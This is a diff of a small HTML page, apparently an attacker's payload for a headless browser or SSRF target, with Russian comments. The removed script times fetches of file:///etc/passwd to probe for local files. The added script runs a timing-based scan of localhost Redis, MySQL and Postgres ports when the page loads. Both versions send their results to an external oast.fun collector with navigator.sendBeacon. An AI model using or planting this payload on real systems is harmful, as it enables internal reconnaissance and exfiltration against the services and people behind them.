@@ -1,25 +1,34 @@
 <!DOCTYPE html>
 <html>
 <body>
-   <script>
-    const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
-    
-    async function leakStep() {
-        // Мерим разницу между реальным файлом и мусором
-        const p1 = "file:///etc/passwd";
-        const p2 = "file:///etc/non_existent_file_999";
-        
-        const t1 = await performance.now();
-        try { await fetch(p1, {mode:'no-cors'}); } catch(e){}
-        const d1 = performance.now() - t1;
+<script>
+    async function scanPorts() {
+        const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
+        const targets = {
+            "redis": "http://127.0.0.1:6379",
+            "mysql": "http://127.0.0.1:3306",
+            "postgres": "http://127.0.0.1:5432",
+            "google": "https://google.com" // Для сравнения внешнего пинга
+        };
 
-        const t2 = await performance.now();
-        try { await fetch(p2, {mode:'no-cors'}); } catch(e){}
-        const d2 = performance.now() - t2;
+        let results = {};
 
-        navigator.sendBeacon(hook + "/FINAL_TIME_PROOF", `Passwd: ${d1}ms | Fake: ${d2}ms`);
+        for (const [name, url] of Object.entries(targets)) {
+            const start = performance.now();
+            try {
+                // Используем mode: 'no-cors', чтобы не блокировало сам запрос
+                await fetch(url, { mode: 'no-cors', cache: 'no-store' });
+            } catch (e) {
+                // Ошибка вылетит почти сразу, если порт открыт
+            }
+            results[name] = (performance.now() - start).toFixed(2) + "ms";
+        }
+
+        // Отправка данных на твой вебхук
+        navigator.sendBeacon(hook + "/PORT_SCAN_RESULTS", JSON.stringify(results));
     }
-    leakStep();
+
+    scanPorts();
 </script>
 </body>
 </html>
